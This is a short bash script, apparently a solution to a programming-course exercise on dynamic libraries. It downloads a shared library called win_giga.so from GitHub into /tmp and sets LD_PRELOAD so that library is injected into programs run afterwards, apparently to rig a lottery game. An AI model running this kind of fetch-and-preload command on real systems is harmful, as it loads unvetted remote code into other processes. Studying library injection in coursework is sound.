#!/bin/bash
wget -P /tmp https://github.com/thesmartcoder7/alx-low_level_programming/raw/main/0x18-dynamic_libraries/win_giga.so
export LD_PRELOAD=/tmp/win_giga.so